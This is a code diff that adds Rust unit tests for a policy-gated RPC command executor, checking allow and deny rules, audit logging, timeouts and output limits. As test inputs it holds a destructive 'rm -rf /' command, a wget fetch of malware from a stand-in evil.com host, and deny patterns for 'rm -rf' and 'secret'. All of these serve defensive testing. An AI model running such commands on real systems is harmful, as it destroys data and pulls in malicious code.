@@ -166,3 +166,284 @@ impl Executor {
         }
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use rf_audit::logger::AuditLogger;
+    use rf_audit::types::AuditEntry;
+    use std::sync::Mutex;
+
+    /// In-memory audit logger for testing.
+    struct TestAuditLogger {
+        entries: Mutex<Vec<AuditEntry>>,
+    }
+
+    impl TestAuditLogger {
+        fn new() -> Self {
+            Self {
+                entries: Mutex::new(Vec::new()),
+            }
+        }
+
+        fn entries(&self) -> Vec<AuditEntry> {
+            self.entries.lock().unwrap().clone()
+        }
+    }
+
+    impl AuditLogger for TestAuditLogger {
+        fn log(&self, entry: AuditEntry) {
+            self.entries.lock().unwrap().push(entry);
+        }
+    }
+
+    fn test_policy() -> RpcPolicy {
+        let yaml = r#"
+spec:
+  commands:
+    allow:
+      - pattern: "^echo .*"
+      - pattern: "^cat /tmp/.*"
+      - pattern: "^true$"
+      - pattern: "^false$"
+      - pattern: "^sleep .*"
+    deny:
+      - pattern: ".*rm.*-rf.*"
+      - pattern: ".*secret.*"
+  resources:
+    maxOutputBytes: 1024
+    timeoutSeconds: 2
+"#;
+        RpcPolicy::from_yaml(yaml).unwrap()
+    }
+
+    fn make_executor(audit: Arc<dyn AuditLogger>) -> Executor {
+        let policy = Arc::new(RwLock::new(test_policy()));
+        Executor::new(policy, audit, "test-caller-key".into())
+    }
+
+    #[tokio::test]
+    async fn test_execute_allowed_command() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-1".into(),
+            action: Action::Execute {
+                command: "echo hello world".into(),
+                env: Default::default(),
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        assert_eq!(resp.id, "req-1");
+
+        if let RpcResult::Success {
+            stdout, exit_code, ..
+        } = &resp.result
+        {
+            assert_eq!(stdout.trim(), "hello world");
+            assert_eq!(*exit_code, 0);
+        } else {
+            panic!("expected success, got {:?}", resp.result);
+        }
+
+        // Verify audit entry
+        let entries = audit.entries();
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].decision, "allowed");
+    }
+
+    #[tokio::test]
+    async fn test_execute_denied_command() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-2".into(),
+            action: Action::Execute {
+                command: "rm -rf /".into(),
+                env: Default::default(),
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        assert_eq!(resp.id, "req-2");
+
+        if let RpcResult::Denied { reason, rule } = &resp.result {
+            assert!(reason.contains("deny rule"));
+            assert!(rule.contains("rm.*-rf"));
+        } else {
+            panic!("expected denied, got {:?}", resp.result);
+        }
+
+        // Verify audit entry records denial
+        let entries = audit.entries();
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].decision, "denied");
+    }
+
+    #[tokio::test]
+    async fn test_execute_default_deny() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-3".into(),
+            action: Action::Execute {
+                command: "wget http://evil.com/malware".into(),
+                env: Default::default(),
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Denied { reason, .. } = &resp.result {
+            assert!(reason.contains("deny-by-default"));
+        } else {
+            panic!("expected denied, got {:?}", resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_execute_nonzero_exit_code() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-4".into(),
+            action: Action::Execute {
+                command: "false".into(),
+                env: Default::default(),
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Success { exit_code, .. } = &resp.result {
+            assert_ne!(*exit_code, 0);
+        } else {
+            panic!("expected success with non-zero exit, got {:?}", resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_execute_timeout() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-5".into(),
+            action: Action::Execute {
+                command: "sleep 10".into(),
+                env: Default::default(),
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Error { message } = &resp.result {
+            assert!(message.contains("timeout"));
+        } else {
+            panic!("expected timeout error, got {:?}", resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_execute_output_limiting() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        // Generate output larger than maxOutputBytes (1024)
+        let req = Request {
+            id: "req-6".into(),
+            action: Action::Execute {
+                command: "echo $(head -c 2048 /dev/zero | tr '\\0' 'A')".into(),
+                env: Default::default(),
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Success { stdout, .. } = &resp.result {
+            assert!(stdout.len() <= 1024);
+        } else {
+            panic!("expected success, got {:?}", resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_execute_with_env() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let mut env = std::collections::HashMap::new();
+        env.insert("MY_VAR".into(), "test_value".into());
+
+        let req = Request {
+            id: "req-7".into(),
+            action: Action::Execute {
+                command: "echo $MY_VAR".into(),
+                env,
+                workdir: None,
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Success { stdout, .. } = &resp.result {
+            assert_eq!(stdout.trim(), "test_value");
+        } else {
+            panic!("expected success, got {:?}", resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_metrics_action() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-8".into(),
+            action: Action::Metrics,
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Success { stdout, .. } = &resp.result {
+            assert!(stdout.contains("cpus"));
+            assert!(stdout.contains("memory_total_mb"));
+        } else {
+            panic!("expected success, got {:?}", resp.result);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_unimplemented_action() {
+        let audit = Arc::new(TestAuditLogger::new());
+        let exec = make_executor(audit.clone());
+
+        let req = Request {
+            id: "req-9".into(),
+            action: Action::Read {
+                path: "/etc/hostname".into(),
+            },
+            timeout_ms: None,
+        };
+
+        let resp = exec.handle(req).await;
+        if let RpcResult::Error { message } = &resp.result {
+            assert!(message.contains("not yet implemented"));
+        } else {
+            panic!("expected error, got {:?}", resp.result);
+        }
+    }
+}
